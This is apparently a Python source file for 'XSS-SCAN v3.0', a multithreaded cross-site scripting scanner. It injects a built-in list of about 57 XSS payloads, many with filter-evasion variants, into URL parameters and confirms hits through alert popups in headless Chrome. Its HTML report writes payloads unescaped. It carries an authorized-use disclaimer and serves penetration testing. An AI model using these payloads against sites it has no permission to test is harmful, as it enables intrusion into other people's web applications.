#!/usr/bin/env python3
# ================================================================
#
#  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗  ██╗
#  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗ ██║
#   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗██║
#   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚████║
#  ██╔╝╚██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚███║
#  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝
#
#  XSS-SCAN v3.0 — Cross-Site Scripting Vulnerability Scanner
#  Author  : UI-HACKER-india
#  GitHub  : https://github.com/UI-HACKER-india
#  YouTube : https://youtube.com/@UI-HACKER-india
#
# ================================================================
# DISCLAIMER: For educational & authorized pentesting ONLY.
# Only test systems you own or have explicit written permission.
# ================================================================

import sys
import os
import re
import json
import time
import urllib.parse
from queue import Queue
from threading import Lock
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException,
    UnexpectedAlertPresentException,
    WebDriverException,
    NoAlertPresentException,
)
from webdriver_manager.chrome import ChromeDriverManager

init(autoreset=True)

# ── Colors ──────────────────────────────────────────────────────
R  = Fore.RED    + Style.BRIGHT
G  = Fore.GREEN  + Style.BRIGHT
Y  = Fore.YELLOW + Style.BRIGHT
C  = Fore.CYAN   + Style.BRIGHT
M  = Fore.MAGENTA+ Style.BRIGHT
W  = Fore.WHITE  + Style.BRIGHT
RS = Style.RESET_ALL

# ── Print lock (thread-safe terminal output) ────────────────────
print_lock = Lock()

def safe_print(msg):
    with print_lock:
        print(msg)

# ─────────────────────────── BOX UTILS ──────────────────────────

def _strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', s)

def _box(lines, color=C, width=70):
    print(color + "┌" + "─"*width + "┐" + RS)
    for line in lines:
        clean_len = len(_strip_ansi(line))
        pad = max(0, width - clean_len - 1)
        print(color + "│" + RS + " " + line + " "*pad + color + "│" + RS)
    print(color + "└" + "─"*width + "┘" + RS)

def section(title, color=M):
    print(f"\n{color}{'═'*72}{RS}")
    print(f"{color}  ▶  {title}{RS}")
    print(f"{color}{'═'*72}{RS}\n")

def log_info(msg):  safe_print(f"  {C}[*]{RS} {msg}")
def log_ok(msg):    safe_print(f"  {G}[✓]{RS} {msg}")
def log_vuln(msg):  safe_print(f"  {R}[VULN ⚡]{RS} {msg}")
def log_safe(msg):  safe_print(f"  {G}[SAFE ✓]{RS} {msg}")
def log_warn(msg):  safe_print(f"  {Y}[!]{RS} {msg}")
def log_err(msg):   safe_print(f"  {R}[✗]{RS} {msg}")

# ─────────────────────────── BANNER ─────────────────────────────

def print_banner():
    print(f"""
{R}
  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗  ██╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗ ██║
   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗██║
   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚████║
  ██╔╝╚██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚███║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝
{RS}""")
    _box([
        f"  {C}XSS-SCAN{RS}  —  Cross-Site Scripting Vulnerability Scanner",
        f"  {Y}Version {RS}: 3.0.0          {Y}Author  {RS}: UI-HACKER-india",
        f"  {Y}GitHub  {RS}: github.com/UI-HACKER-india",
        f"  {Y}YouTube {RS}: youtube.com/@UI-HACKER-india",
        "",
        f"  {G}Detection  {RS}: Selenium Headless Chrome  {G}(Real Alert Popup){RS}",
        f"  {G}Accuracy   {RS}: ~95%  {G}(Zero False Positives){RS}",
        "",
        f"  {R}⚠  For Educational & Authorized Pentesting Only  ⚠{RS}",
    ], color=M)
    print()

# ─────────────────────── BUILTIN PAYLOADS ───────────────────────

BUILTIN_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<Script>alert(1)</Script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script >alert(1)</script >",
    "</script><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src='x' onerror='alert(1)'>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<img src=1 onerror=\"javascript:alert(1)\">",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<SVG ONLOAD=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<body/onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<select autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "<scRipt>alert(1)</scRipt>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<iMg src=x oNeRrOr=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe/src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<marquee onstart=alert(1)>xss</marquee>",
    "<video autoplay onloadstart=alert(1)><source></video>",
    "<audio autoplay onloadstart=alert(1)><source></audio>",
    "<script>window['alert'](1)</script>",
    "<script>eval('ale'+'rt(1)')</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "\"><details/open/ontoggle=alert(1)>",
    "';alert(1)//",
    "\";alert(1)//",
    "</script><svg onload=alert(1)>",
    "<img src=`xx:xx`onerror=alert(1)>",
    "${alert(1)}",
    "{{alert(1)}}",
]

# ─────────────────────── CHROME DRIVER ──────────────────────────

def create_driver():
    """Create one invisible headless Chrome instance."""
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-extensions")
    options.add_argument("--log-level=3")
    options.add_argument("--silent")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])

    service = ChromeService(ChromeDriverManager().install())
    service.log_path = os.devnull  # Chrome logs suppress karo

    return webdriver.Chrome(service=service, options=options)

# ─────────────────────── URL INJECTION ──────────────────────────

def build_test_urls(url, payload):
    """Payload ko URL ke har GET parameter mein inject karo."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        # Koi params nahi hain — directly append karo
        test = url + ("&" if "?" in url else "?") + "xss=" + urllib.parse.quote(payload, safe="")
        return [test]

    test_urls = []
    for key in params:
        p = {k: v[0] for k, v in params.items()}
        p[key] = payload
        new_q = urllib.parse.urlencode(p)
        test_urls.append(urllib.parse.urlunparse(parsed._replace(query=new_q)))
    return test_urls

# ──────────────────── CORE: SINGLE PAYLOAD TEST ──────────────────

def test_payload(driver, url, payload, alert_timeout=3):
    """
    Ek payload ek URL pe test karo.
    Returns: dict with result or None
    
    Yehi hai asli magic:
    - Headless Chrome se URL open karo
    - alert() popup fire hua? → REAL XSS confirmed
    - Nahi aaya? → NOT VULNERABLE (false positive nahi)
    """
    test_urls = build_test_urls(url, payload)

    for test_url in test_urls:
        try:
            driver.get(test_url)

            try:
                # ── REAL DETECTION: alert popup ka wait karo ──
                WebDriverWait(driver, alert_timeout).until(EC.alert_is_present())

                alert = driver.switch_to.alert
                alert_text = alert.text   # popup ka text capture karo
                alert.accept()            # OK button click (popup band)

                # Alert aaya = 100% CONFIRMED XSS!
                return {
                    "payload": payload,
                    "test_url": test_url,
                    "alert_text": alert_text,
                    "confirmed": True
                }

            except TimeoutException:
                # alert_timeout seconds mein koi popup nahi aaya = safe
                pass

            except UnexpectedAlertPresentException:
                # Alert already present tha page load pe hi
                try:
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    return {
                        "payload": payload,
                        "test_url": test_url,
                        "alert_text": alert_text,
                        "confirmed": True
                    }
                except Exception:
                    pass

        except WebDriverException:
            pass

    return None  # Koi bhi test_url pe alert nahi aaya = NOT VULNERABLE

# ──────────────────────── SCAN ONE URL ───────────────────────────

def scan_url(url, payloads, driver_pool, threads, alert_timeout):
    """Ek URL ko saare payloads se scan karo — driver pool use karke."""

    result = {
        "url": url,
        "vulnerable_payloads": [],
        "total_tested": 0,
        "vulnerable_count": 0,
        "status": "clean"
    }

    section(f"Scanning → {url}")
    log_info(f"Payloads  : {Y}{len(payloads)}{RS}")
    log_info(f"Threads   : {Y}{threads}{RS}")
    log_info(f"Method    : {G}Selenium Headless Chrome — Real Alert Detection{RS}")
    print()

    done_count = [0]  # list taaki thread mein modify kar sakein
    total = len(payloads)
    found_lock = Lock()

    def run_one(payload):
        driver = driver_pool.get()  # pool se ek free Chrome lo
        try:
            hit = test_payload(driver, url, payload, alert_timeout)
            return hit
        finally:
            driver_pool.put(driver)  # Chrome wapas pool mein daalo

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(run_one, p): p for p in payloads}

        for future in as_completed(futures):
            hit = future.result()
            with found_lock:
                done_count[0] += 1
                result["total_tested"] += 1

                # ── Live progress bar ──
                pct = int((done_count[0] / total) * 40)
                bar = G + "█"*pct + RS + "░"*(40-pct)
                with print_lock:
                    sys.stdout.write(
                        f"\r  {C}Progress{RS} [{bar}] "
                        f"{Y}{done_count[0]}/{total}{RS}   "
                    )
                    sys.stdout.flush()

                if hit:
                    result["vulnerable_payloads"].append(hit)
                    result["vulnerable_count"] += 1
                    result["status"] = "vulnerable"

                    # ── Vulnerable line print karo (progress clear karke) ──
                    with print_lock:
                        sys.stdout.write("\r" + " "*80 + "\r")
                    log_vuln(
                        f"{G}ALERT FIRED!{RS}  "
                        f"Payload : {W}{hit['payload'][:60]}{'...' if len(hit['payload'])>60 else ''}{RS}\n"
                        f"          {C}Alert text : {Y}\"{hit['alert_text']}\"{RS}"
                    )

    with print_lock:
        sys.stdout.write("\r" + " "*80 + "\r")

    print()
    if result["status"] == "vulnerable":
        log_ok(f"Result → {R}{result['vulnerable_count']} CONFIRMED XSS{RS} found in {Y}{url}{RS}")
    else:
        log_safe(f"Result → {G}No XSS vulnerability found{RS} in {Y}{url}{RS}")

    return result

# ──────────────────────── SUMMARY ────────────────────────────────

def display_summary(results, payloads_count):
    section("SCAN COMPLETE — FINAL RESULTS", color=G)

    vuln_urls  = [r for r in results if r["status"]=="vulnerable"]
    clean_urls = [r for r in results if r["status"]=="clean"]
    total_hits = sum(r["vulnerable_count"] for r in results)
    total_req  = sum(r["total_tested"] for r in results)

    _box([
        f"  {C}URLs Scanned       {RS}: {Y}{len(results)}{RS}",
        f"  {C}Total Tested       {RS}: {Y}{total_req}{RS} payload-URL combinations",
        f"  {C}Detection Method   {RS}: {G}Selenium — Real Alert Popup{RS}",
        "",
        f"  {R}Vulnerable URLs    {RS}: {R}{len(vuln_urls)}{RS}",
        f"  {G}Clean URLs         {RS}: {G}{len(clean_urls)}{RS}",
        f"  {Y}Total Confirmed XSS{RS}: {Y}{total_hits}{RS}",
    ], color=M)
    print()

    if vuln_urls:
        print(f"  {R}⚠  CONFIRMED VULNERABLE TARGETS:{RS}\n")
        for r in vuln_urls:
            payload_lines = []
            for h in r["vulnerable_payloads"][:5]:
                payload_lines.append(f"    {G}•{RS} {h['payload'][:60]}")
                payload_lines.append(f"      {C}alert text: {Y}\"{h['alert_text']}\"{RS}")
            if len(r["vulnerable_payloads"]) > 5:
                payload_lines.append(f"    {Y}...and {len(r['vulnerable_payloads'])-5} more{RS}")
            _box([
                f"  {R}[VULNERABLE]{RS}  {W}{r['url']}{RS}",
                f"  {Y}↳ {r['vulnerable_count']} confirmed payload(s){RS}",
                *payload_lines,
            ], color=R)
            print()
    else:
        _box([f"  {G}✔  No XSS vulnerabilities confirmed in any scanned URL.{RS}"], color=G)
        print()

    return {
        "total_urls": len(results),
        "vulnerable_urls": len(vuln_urls),
        "clean_urls": len(clean_urls),
        "total_requests": total_req,
        "total_confirmed_xss": total_hits,
    }

# ─────────────────────── SAVE RESULTS ───────────────────────────

def save_results(results, summary, fmt="txt"):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"xss_results_{ts}.{fmt}"

    if fmt == "json":
        with open(fname, "w") as f:
            json.dump({
                "scan_date": datetime.now().isoformat(),
                "tool": "XSS-SCAN v3.0 by UI-HACKER-india",
                "detection_method": "Selenium Headless Chrome — Real Alert Detection",
                "summary": summary,
                "results": results
            }, f, indent=4)

    elif fmt == "html":
        rows = ""
        for r in results:
            color = "#ff4444" if r["status"]=="vulnerable" else "#44ff88"
            label = "VULNERABLE ⚡" if r["status"]=="vulnerable" else "CLEAN ✓"
            phtml = "".join(
                f"<li><code>{h['payload']}</code> → alert: <b>\"{h['alert_text']}\"</b></li>"
                for h in r["vulnerable_payloads"]
            )
            rows += f"""<tr>
<td><a href='{r["url"]}' target='_blank'>{r["url"]}</a></td>
<td style='color:{color};font-weight:bold'>{label}</td>
<td>{r['vulnerable_count']}</td>
<td><ul>{phtml}</ul></td>
</tr>"""

        html = f"""<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<title>XSS-SCAN Results — UI-HACKER-india</title>
<style>
  body{{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;padding:30px}}
  h1{{color:#ff4444;border-bottom:2px solid #ff4444;padding-bottom:10px}}
  h2{{color:#00ffcc}}
  p{{color:#aaa}}
  table{{width:100%;border-collapse:collapse;margin-top:20px}}
  th{{background:#1a1a2e;color:#00ffcc;padding:10px;text-align:left;border:1px solid #333}}
  td{{padding:8px 10px;border:1px solid #333;vertical-align:top}}
  tr:nth-child(even){{background:#111}}
  code{{background:#222;padding:2px 6px;border-radius:3px;font-size:.85em;color:#ff9900;word-break:break-all}}
  .stat{{background:#1a1a2e;padding:15px;border-radius:8px;margin:10px 5px;display:inline-block;min-width:150px;text-align:center}}
  .num{{font-size:2em;font-weight:bold}}
  .badge{{background:#0d2b0d;color:#44ff88;padding:4px 10px;border-radius:4px;font-size:.8em}}
</style>
</head>
<body>
<h1>⚡ XSS-SCAN — Vulnerability Report</h1>
<p>Tool: <b>XSS-SCAN v3.0 by UI-HACKER-india</b> | 
Detection: <b>Selenium Headless Chrome — Real Alert Popup</b> | 
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<div>
  <div class='stat'><div class='num' style='color:#00aaff'>{summary['total_urls']}</div>URLs Scanned</div>
  <div class='stat'><div class='num' style='color:#ff4444'>{summary['vulnerable_urls']}</div>Vulnerable</div>
  <div class='stat'><div class='num' style='color:#44ff88'>{summary['clean_urls']}</div>Clean</div>
  <div class='stat'><div class='num' style='color:#ff9900'>{summary['total_confirmed_xss']}</div>Confirmed XSS</div>
</div>
<h2>Detailed Results</h2>
<table>
<tr><th>URL</th><th>Status</th><th>Confirmed Hits</th><th>Payloads & Alert Text</th></tr>
{rows}
</table>
</body>
</html>"""
        with open(fname, "w") as f:
            f.write(html)

    else:  # txt
        with open(fname, "w") as f:
            f.write("="*65 + "\n")
            f.write("   XSS-SCAN v3.0 — Results Report\n")
            f.write("   Tool  : XSS-SCAN by UI-HACKER-india\n")
            f.write("   Method: Selenium Headless Chrome — Real Alert Detection\n")
            f.write(f"   Date  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*65 + "\n\n")
            f.write(f"SUMMARY\n{'─'*40}\n")
            for k, v in summary.items():
                f.write(f"  {k:<28}: {v}\n")
            f.write(f"\nDETAILED RESULTS\n{'─'*40}\n\n")
            for r in results:
                status = "VULNERABLE ⚡" if r["status"]=="vulnerable" else "CLEAN ✓"
                f.write(f"URL    : {r['url']}\n")
                f.write(f"Status : {status}\n")
                f.write(f"Tested : {r['total_tested']} payloads\n")
                f.write(f"Hits   : {r['vulnerable_count']}\n")
                for h in r["vulnerable_payloads"]:
                    f.write(f"  Payload    : {h['payload']}\n")
                    f.write(f"  Alert Text : \"{h['alert_text']}\"\n")
                    f.write(f"  Test URL   : {h['test_url']}\n")
                f.write("\n" + "─"*50 + "\n\n")

    return fname

# ──────────────────────────── MAIN ──────────────────────────────

def ask(prompt_text, valid=None):
    while True:
        val = input(f"  {C}[?]{RS} {prompt_text}").strip()
        if valid is None or val in valid:
            return val
        log_warn(f"Please enter one of: {valid}")

def main():
    print_banner()

    # ── Step 1: URL input ──
    _box([
        f"  {Y}[1]{RS}  Single URL",
        f"  {Y}[2]{RS}  File containing multiple URLs",
    ], color=C, width=45)
    print()
    mode = ask("Choose [1/2]: ", valid=["1","2"])

    urls = []
    if mode == "1":
        while True:
            url = input(f"\n  {C}[?]{RS} Enter target URL: ").strip()
            if url.startswith(("http://","https://")):
                urls.append(url)
                break
            log_warn("URL must start with http:// or https://")
    else:
        while True:
            path = input(f"\n  {C}[?]{RS} Path to URLs file: ").strip()
            if os.path.isfile(path):
                with open(path) as f:
                    urls = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                log_ok(f"Loaded {Y}{len(urls)}{RS} URLs from file.")
                break
            log_err(f"File not found: {path}")

    # ── Step 2: Payload source ──
    print()
    _box([
        f"  {Y}[1]{RS}  Built-in payloads  {G}({len(BUILTIN_PAYLOADS)} payloads){RS}",
        f"  {Y}[2]{RS}  Custom payload file {C}(supports 2000+ payloads){RS}",
    ], color=C, width=52)
    print()
    pc = ask("Choose [1/2]: ", valid=["1","2"])

    if pc == "1":
        payloads = BUILTIN_PAYLOADS
        log_ok(f"Loaded {Y}{len(payloads)}{RS} built-in XSS payloads.")
    else:
        while True:
            path = input(f"\n  {C}[?]{RS} Path to payload file: ").strip()
            if os.path.isfile(path):
                with open(path, encoding="utf-8", errors="ignore") as f:
                    payloads = [l.strip() for l in f if l.strip()]
                log_ok(f"Loaded {Y}{len(payloads)}{RS} payloads.")
                break
            log_err(f"File not found: {path}")

    # ── Step 3: Options ──
    print()
    _box([
        f"  {Y}Advanced Options{RS}  (Enter = default use karo)",
        "",
        f"  {C}Threads{RS}      : Parallel Chrome instances  {Y}[default: 5]{RS}",
        f"  {C}Alert Timeout{RS}: Kitne sec wait karo popup ka  {Y}[default: 3]{RS}",
        "",
        f"  {W}Note:{RS} Zyada threads = zyada RAM use. 5 recommended.",
    ], color=M, width=58)
    print()

    t_in  = input(f"  {C}[?]{RS} Threads       [5]: ").strip()
    to_in = input(f"  {C}[?]{RS} Alert Timeout [3]: ").strip()
    threads       = int(t_in)  if t_in.isdigit()  else 5
    alert_timeout = int(to_in) if to_in.isdigit() else 3

    # ── Step 4: Confirm ──
    print()
    _box([
        f"  {C}SCAN CONFIGURATION{RS}",
        "",
        f"  URLs          : {Y}{len(urls)}{RS}",
        f"  Payloads      : {Y}{len(payloads)}{RS}",
        f"  Threads       : {Y}{threads}{RS}  (parallel Chrome instances)",
        f"  Alert Timeout : {Y}{alert_timeout}s{RS}  (popup wait time per payload)",
        f"  Method        : {G}Selenium Headless Chrome{RS}",
        "",
        f"  {W}Estimated time: ~{int(len(payloads)*len(urls)*alert_timeout/threads)}s (worst case){RS}",
    ], color=G, width=55)
    print()

    if ask("Start scan? [Y/n]: ").lower() == "n":
        log_warn("Scan cancelled.")
        sys.exit(0)

    # ── Step 5: Initialize driver pool ──
    print()
    log_info(f"Starting {Y}{threads}{RS} headless Chrome instance(s)...")
    log_info("Please wait — Chrome ko load hone do...")
    print()

    driver_pool = Queue()
    try:
        for i in range(threads):
            driver_pool.put(create_driver())
            sys.stdout.write(f"\r  {G}[✓]{RS} Chrome instance {Y}{i+1}/{threads}{RS} ready   ")
            sys.stdout.flush()
    except Exception as e:
        print()
        log_err(f"Chrome start nahi hua: {e}")
        log_warn("Fix: sudo apt install google-chrome-stable -y")
        sys.exit(1)

    print(f"\n  {G}[✓]{RS} All Chrome instances ready!\n")

    # ── Step 6: Scan ──
    start = time.time()
    all_results = []

    for url in urls:
        url = url.strip()
        if not url or url.startswith("#"):
            continue
        if not url.startswith(("http://","https://")):
            log_warn(f"Skipping: {url}")
            continue
        result = scan_url(url, payloads, driver_pool, threads, alert_timeout)
        all_results.append(result)

    elapsed = time.time() - start

    # ── Step 7: Close all Chrome instances ──
    log_info("Closing Chrome instances...")
    while not driver_pool.empty():
        try:
            driver_pool.get().quit()
        except Exception:
            pass

    log_info(f"Total scan time: {Y}{elapsed:.2f} seconds{RS}")

    # ── Step 8: Summary ──
    summary = display_summary(all_results, len(payloads))

    # ── Step 9: Save results ──
    print()
    save = ask("Save results to file? [Y/n]: ").lower()
    if save != "n":
        print()
        _box([
            f"  {Y}[1]{RS}  TXT  — human readable",
            f"  {Y}[2]{RS}  JSON — machine readable",
            f"  {Y}[3]{RS}  HTML — browser report (recommended)",
        ], color=C, width=42)
        print()
        fc = input(f"  {C}[?]{RS} Format [1/2/3]: ").strip()
        fmt = {"2":"json","3":"html"}.get(fc, "txt")
        fname = save_results(all_results, summary, fmt=fmt)
        log_ok(f"Results saved → {G}{fname}{RS}")

    print()
    _box([
        f"  {C}Thanks for using XSS-SCAN v3.0 | UI-HACKER-india{RS}",
        f"  {Y}youtube.com/@UI-HACKER-india{RS}",
        f"  {R}Use only on systems you own or have permission to test.{RS}",
    ], color=M)
    print()

# ────────────────────────── ENTRY ───────────────────────────────

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {Y}[!] Interrupted. Closing Chrome instances...{RS}")
        sys.exit(0)
